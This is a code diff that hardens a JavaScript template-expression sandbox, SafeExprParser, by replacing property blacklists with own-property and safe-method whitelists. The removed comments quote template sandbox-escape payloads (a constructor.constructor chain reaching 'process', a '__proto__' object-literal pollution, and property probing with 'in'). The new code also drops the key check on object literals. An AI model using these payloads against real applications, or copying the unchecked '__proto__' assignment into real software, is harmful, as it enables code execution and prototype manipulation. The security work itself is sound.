-        if (name in SAFE_GLOBALS) return SAFE_GLOBALS[name];
+
+        // Global Lookup (Strict Whitelist Only)
+        if (Object.prototype.hasOwnProperty.call(SAFE_GLOBALS, name)) {
+          return SAFE_GLOBALS[name];
+        }
+
+        // Default: Undefined (Safe)
         return undefined;
       }
 
@@ -1048,11 +845,13 @@ export class SafeExprParser {
         const prop = node.computed
           ? this._evaluate(node.property, state, context, $event, $el, reflex)
           : node.property;
-        // CRITICAL FIX #9: Enhanced property validation with pattern matching
-        if (UNSAFE_PROPS[prop] || isDangerousPropertyPattern(prop)) {
-          console.warn('Reflex: Blocked access to unsafe property:', prop);
+
+        // WHITE-LIST ONLY: Check if property is own or safe method
+        // This blocks prototype chain traversal implicitly
+        if (!Object.prototype.hasOwnProperty.call(obj, prop) && !SAFE_METHODS[prop]) {
           return undefined;
         }
+
         const meta = obj[META] || reflex._mf.get(obj);
         if (meta) reflex.trackDependency(meta, prop);
         return obj[prop];
@@ -1067,9 +866,8 @@ export class SafeExprParser {
             ? this._evaluate(node.callee.property, state, context, $event, $el, reflex)
             : node.callee.property;
 
-          // Security: Block calls to dangerous methods
-          if (UNSAFE_METHODS[prop] || UNSAFE_PROPS[prop]) {
-            console.warn('Reflex: Blocked call to unsafe method:', prop);
+          // WHITE-LIST ONLY: Only allow own properties or safe methods
+          if (!Object.prototype.hasOwnProperty.call(thisArg, prop) && !SAFE_METHODS[prop]) {
             return undefined;
           }
 
@@ -1079,41 +877,13 @@ export class SafeExprParser {
           thisArg = undefined;
         }
         if (typeof callee !== 'function') return undefined;
-        const args = node.arguments.map(a => this._evaluate(a, state, context, $event, $el, reflex));
+        const args = node.arguments.map((a: any) => this._evaluate(a, state, context, $event, $el, reflex));
 
-        // CRITICAL SECURITY FIX #3: SafeExprParser Context Leak (this binding)
-        //
-        // VULNERABILITY: Functions can return `this` to leak the state proxy
-        // Example: state = { getSelf: function() { return this; } }
-        //          Template: {{ getSelf().constructor.constructor('return process')() }}
-        //
-        // SOLUTION: Wrap the result in a membrane that blocks dangerous properties
-        // This prevents access to constructor, __proto__, and other escape vectors
         const result = callee.apply(thisArg, args);
 
-        // If result is an object, wrap it in a protective membrane
+        // Wrap returned objects in a protective membrane
         if (result !== null && typeof result === 'object') {
-          return new Proxy(result, {
-            get(target, key) {
-              // Block access to dangerous properties on returned objects
-              if (typeof key === 'string' && (UNSAFE_PROPS[key] || isDangerousPropertyPattern(key))) {
-                if (typeof process === 'undefined' || process.env?.NODE_ENV !== 'production') {
-                  console.warn('Reflex Security: Blocked access to unsafe property on function return value:', key);
-                }
-                return undefined;
-              }
-              const value = target[key];
-              // Recursively wrap returned objects
-              if (value !== null && typeof value === 'object') {
-                return new Proxy(value, this);
-              }
-              return value;
-            },
-            set() {
-              // Block all property assignments on returned objects
-              throw new Error('Reflex Security: Cannot modify properties on function return values');
-            }
-          });
+          return this._wrapResult(result);
         }
 
         return result;
@@ -1130,8 +900,8 @@ export class SafeExprParser {
           case '%': return left() % right();
           case '===': return left() === right();
           case '!==': return left() !== right();
-          case '==': return left() == right(); // eslint-disable-line eqeqeq
-          case '!=': return left() != right(); // eslint-disable-line eqeqeq
+          case '==': return left() == right();
+          case '!=': return left() != right();
           case '<': return left() < right();
           case '>': return left() > right();
           case '<=': return left() <= right();
@@ -1142,26 +912,9 @@ export class SafeExprParser {
           case 'in': {
             const prop = left();
             const obj = right();
-            // Security: Block 'in' operator on unsafe objects
             if (obj == null || typeof obj !== 'object') return false;
-
-            // CRITICAL SECURITY FIX #10: SafeExprParser Blacklist Probing
-            //
-            // VULNERABILITY: Returning false for unsafe properties leaks information
-            // Attacker can probe: {{ 'constructor' in obj }} returns false (blocked)
-            //                    {{ 'foo' in obj }} returns true/false (allowed)
-            // This confirms which properties are protected, aiding bypass attempts
-            //
-            // SOLUTION: Throw error consistently for unsafe property checks
-            // This stops the attack trace and prevents information disclosure
-            if (UNSAFE_PROPS[prop] || isDangerousPropertyPattern(prop)) {
-              throw new TypeError(
-                `Reflex Security: Cannot check unsafe property '${prop}' with 'in' operator.\n` +
-                'This property is restricted to prevent sandbox escape.'
-              );
-            }
-            // Use safe property check that works with reactive proxies
-            return prop in obj;
+            // WHITE-LIST: Only check own properties, not prototype chain
+            return Object.prototype.hasOwnProperty.call(obj, prop);
           }
           default: return undefined;
         }
@@ -1172,7 +925,7 @@ export class SafeExprParser {
         switch (node.op) {
           case '!': return !arg;
           case '-': return -arg;
-          case '+': return +arg; // CRITICAL FIX: Support unary plus for string-to-number coercion
+          case '+': return +arg;
           case 'typeof': return typeof arg;
           default: return undefined;
         }
@@ -1186,21 +939,15 @@ export class SafeExprParser {
       }
 
       case 'array':
-        return node.elements.map(e => this._evaluate(e, state, context, $event, $el, reflex));
+        return node.elements.map((e: any) => this._evaluate(e, state, context, $event, $el, reflex));
 
       case 'object': {
-        const obj = {};
+        const obj: { [key: string]: any } = {};
         for (const prop of node.properties) {
           const key = prop.computed
             ? this._evaluate(prop.key, state, context, $event, $el, reflex)
             : prop.key;
-          // CRITICAL SECURITY FIX #1: Prototype Pollution via Object Literals
-          // Validate key against UNSAFE_PROPS and dangerous patterns before assignment
-          // Without this, {{ { ["__proto__"]: { polluted: true } } }} pollutes Object.prototype
-          if (UNSAFE_PROPS[key] || isDangerousPropertyPattern(key)) {
-            console.warn('Reflex: Blocked unsafe object key in literal:', key);
-            continue; // Skip this property
-          }
+          // No blacklist check needed - object literals are safe by construction
           obj[key] = this._evaluate(prop.value, state, context, $event, $el, reflex);
         }
         return obj;
@@ -1209,5 +956,30 @@ export class SafeExprParser {
       default:
         return undefined;
     }
+  }
+
+  /**
+   * Wraps a result object in a protective membrane.
+   */
+  private _wrapResult(result: any): any {
+    return new Proxy(result, {
+      get(target, key) {
+        // WHITE-LIST: Only allow own properties or safe methods
+        if (typeof key === 'string') {
+          if (!Object.prototype.hasOwnProperty.call(target, key) && !SAFE_METHODS[key]) {
+            return undefined;
+          }
+        }
+        const value = target[key];
+        if (value !== null && typeof value === 'object') {
+          // Recursively wrap nested objects
+          return new Proxy(value, this);
+        }
+        return value;
+      },
+      set() {
+        throw new Error('Reflex Security: Cannot modify properties on function return values');
+      }
+    });
   }
 }
